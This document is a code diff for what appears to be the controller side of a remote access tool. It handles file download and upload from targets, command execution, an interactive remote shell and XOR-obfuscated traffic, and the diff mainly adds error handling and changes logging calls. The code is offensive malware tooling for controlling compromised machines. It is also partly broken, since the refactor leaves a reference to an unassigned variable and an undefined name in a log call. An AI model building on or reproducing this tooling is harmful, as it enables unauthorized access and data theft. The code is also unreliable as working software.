@@ -70,18 +70,24 @@ class tcp:
                     conn.close()
                     
                 elif cmd.startswith(':download'):
-                    getname = cmd.split(" ")
-                    fname = getname[1]
-                    core.logging.info("Saving %s from %s." % (fname, name))
-                    self.download(fname, name)
-                    self.handle(conn, name)
+                    try:
+                        getname = cmd.split(" ")
+                        fname = getname[1]
+                        core.logging.info("Saving %s from %s." % (fname, name))
+                        self.download(fname, name)
+                        self.handle(conn, name)
+                    except IndexError:
+                        print("[!] Must specify download file!")
                     
                 elif cmd.startswith(':upload'):
-                    getname = cmd.split(" ")
-                    loc_file = getname[1]
-                    core.logging.info("Uploading %s to %s." % (loc_name, name))
-                    self.upload(loc_file)
-                    self.handle(conn, name)
+                    try:
+                        getname = cmd.split(" ")
+                        loc_file = getname[1]
+                        core.logging.info("Uploading %s to %s." % (loc_name, name))
+                        self.upload(loc_file)
+                        self.handle(conn, name)
+                    except IndexError:
+                        print("[!] Must specify upload file!")
                     
                 elif cmd.startswith(':exec'):
                     getname = cmd.split(" ")
@@ -286,29 +292,27 @@ class xor:
             conn.connect((HOST, PORT))
             print("[+] Connection established!")
             print("[+] Type :help to view commands")
-            logging.info("New connection established to %s" % name)
+            core.logging.info("New connection established to %s" % name)
         except:
             print("[!] Connection error!")
-            logging.error("Connection to %s failed." % name)
+            core.logging.error("Connection to %s failed." % name)
         
         while True:
-            data = conn.recv(socksize)
-            data2 = xor(data, pin)
+            data = xor(conn.recv(socksize), pin)
             
-            if data2.startswith(":savef"):
+            if data.startswith(":savef"):
                 getname = data2.split(" ")
                 fname = getname[1]
-                logging.info("Saved file %s from %s" % (fname, name))
+                core.logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data2 == ("Complete"):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data2 == "shell => ":
-                cmd = raw_input(data2)
-                cmd2 = xor(cmd, pin)
-                conn.sendall(str(cmd2))
+            elif data == "shell => ":
+                cmd = raw_input(data)
+                conn.sendall(xor(cmd, pin))
                 
                 if cmd == (':killme'):
                     print("[!] Shutting down server!")
@@ -375,8 +379,7 @@ class xor:
                     
                     
             elif data:
-                data2 = xor(data, pin)
-                print data2
+                print data
                 
         conn.close()
         
@@ -405,7 +408,7 @@ class xor:
             if data2.startswith(":savef"):
                 getname = data2.split(" ")
                 fname = getname[1]
-                logging.info("Saved file %s from %s" % (fname, name))
+                core.logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
                 
             elif data2 == ("Complete"):
